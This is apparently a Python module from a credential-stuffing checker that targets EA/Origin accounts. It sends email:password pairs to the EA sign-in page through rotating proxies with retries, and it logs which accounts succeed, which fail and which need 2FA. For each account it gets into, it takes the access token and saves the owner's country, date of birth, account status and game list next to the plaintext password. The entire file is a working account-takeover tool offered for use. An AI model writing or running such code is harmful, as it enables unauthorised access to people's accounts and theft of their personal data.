from modules.variables import Checker
from modules.functions import bad_proxy, log, save, set_proxy, return_proxy
from requests import Session
import functools
from requests.adapters import HTTPAdapter, Retry

def check(email:str,password:str):
    while not Checker.stopping:
        try:
            with Session() as s:
                proxy = set_proxy()
                proxy_set = set_proxy(proxy)

                s.request = functools.partial(s.request, timeout=Checker.timeout)
                s.proxies.update(proxy_set)
                retries = Retry(total=Checker.retries, backoff_factor=0.1)
                s.mount('http://', HTTPAdapter(max_retries=retries))
                s.mount('https://', HTTPAdapter(max_retries=retries))

                r = s.get('https://signin.ea.com/p/originX/login?execution=e1130480862s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fdisplay%3DoriginXWeb%252Flogin%26response_type%3Dcode%26release_type%3Dprod%26redirect_uri%3Dhttps%253A%252F%252Fwww.origin.com%252Fviews%252Flogin.html%26locale%3Den_US%26client_id%3DORIGIN_SPA_ID')
                
                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" ,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" ,
                    "Sec-Fetch-Site": "same-origin" ,
                    "Sec-Fetch-Mode": "navigate" ,
                    "Sec-Fetch-User": "?1" ,
                    "Sec-Fetch-Dest": "document" ,
                    "Referer": "https://signin.ea.com/p/originX/login?execution=e1130480862s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fdisplay%3DoriginXWeb%252Flogin%26response_type%3Dcode%26release_type%3Dprod%26redirect_uri%3Dhttps%253A%252F%252Fwww.origin.com%252Fviews%252Flogin.html%26locale%3Den_US%26client_id%3DORIGIN_SPA_ID" ,
                    "Accept-Language": "en-US,en;q=0.9" ,
                    "Accept-Encoding": "gzip, deflate" ,
                    "Content-Type": "application/x-www-form-urlencoded"
                }
                data = {'email':email,'password':password,'_eventId':'submit','cid':'2vs4h2TvpNEUVs08ktFb5qAtUDbZlUF3','showAgeUp':True,'googleCaptchaResponse':None,'thirdPartyCaptchaResponse':None,'_rememberMe':'on','rememberMe':'on'}
                r = s.post(r.url,data=data,headers=headers)
                if 'Your credentials are incorrect or have expired' in r.text or "Your account has been disabled" in r.text:
                    Checker.bad += 1
                    return_proxy(proxy)
                    return
                if 'Verify your identity' in r.text:
                    if not Checker.cui: log("custom",":".join([email,password]),"Origin")
                    save("Origin","custom",Checker.time,":".join([email,password])+' | 2FA')
                    Checker.custom += 1
                    return_proxy(proxy)
                    return
                if "latestSuccessLogin" not in r.text:
                    raise
                
                fid = r.text.split("fid=")[1].split("\";")[0]
                headers = {
                    "Host": "accounts.ea.com" ,
                    "Connection": "keep-alive" ,
                    "Upgrade-Insecure-Requests": "1" ,
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" ,
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" ,
                    "Sec-Fetch-Site": "same-site" ,
                    "Sec-Fetch-Mode": "navigate" ,
                    "Sec-Fetch-Dest": "document" ,
                    "Referer": "https://signin.ea.com/" ,
                    "Accept-Language": "en-US,en;q=0.9" ,
                }
                s.get(f"https://accounts.ea.com/connect/auth?display=originXWeb%2Flogin&response_type=code&release_type=prod&redirect_uri=https%3A%2F%2Fwww.origin.com%2Fviews%2Flogin.html&locale=en_US&client_id=ORIGIN_SPA_ID&fid={fid}",allow_redirects=False)

                headers = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" ,
                    "Pragma": "no-cache" ,
                    "Accept": "*/*" ,
                }
                r = s.get("https://accounts.ea.com/connect/auth?client_id=ORIGIN_JS_SDK&response_type=token&redirect_uri=nucleus:rest&prompt=none&release_type=prod",headers=headers)
                access_token = r.json()['access_token']

                headers = {
                    "Host": "gateway.ea.com" ,
                    "Connection": "keep-alive" ,
                    "X-Include-UnderAge": "true" ,
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" ,
                    "Authorization": f"Bearer {access_token}" ,
                    "X-Extended-Pids": "true" ,
                    "Accept": "*/*" ,
                    "Origin": "https://www.origin.com" ,
                    "Sec-Fetch-Site": "cross-site" ,
                    "Sec-Fetch-Mode": "cors" ,
                    "Sec-Fetch-Dest": "empty" ,
                    "Referer": "https://www.origin.com/" ,
                    "Accept-Language": "en-US,en;q=0.9" ,
                    "Accept-Encoding": "gzip, deflate" ,
                }
                r = s.get('https://gateway.ea.com/proxy/identity/pids/me',headers=headers)
                country = r.json()['pid']['country']
                birth = r.json()['pid']['dob']
                status = r.json()['pid']['status']
                email_status = r.json()['pid']['emailStatus']
                pid = r.json()['pid']['pidId']

                headers = {
                    "Host": "api1.origin.com" ,
                    "Connection": "keep-alive" ,
                    "Accept": "application/vnd.origin.v3+json; x-cache/force-write" ,
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36" ,
                    "AuthToken": access_token ,
                    "Origin": "https://www.origin.com" ,
                    "Sec-Fetch-Site": "same-site" ,
                    "Sec-Fetch-Mode": "cors" ,
                    "Sec-Fetch-Dest": "empty" ,
                    "Referer": "https://www.origin.com/" ,
                    "Accept-Language": "en-US,en;q=0.9" ,
                    "Accept-Encoding": "gzip, deflate" ,
                }
                r = s.get(f'https://api1.origin.com/ecommerce2/consolidatedentitlements/{pid}?machine_hash=1',headers=headers)
                games = []
                for game in r.json()['entitlements']:
                    try: games.append(' = '.join(game['offerPath'].split('/')[-2:]).title())
                    except: games.append(game['offerPath'].title())
                
                if not Checker.cui: log("good",':'.join([email,password]),"Origin")
                save("Origin","good",Checker.time,':'.join([email,password])+f" | Status: {status} | Country: {country} | Date Of Birth: {birth} | Email Status: {email_status} | Total Games: {len(games)} | Games List: {games}")
                Checker.good += 1
                return_proxy(proxy)
                return


        except:
            bad_proxy(proxy)
            return_proxy(proxy)
            Checker.errors += 1
        
        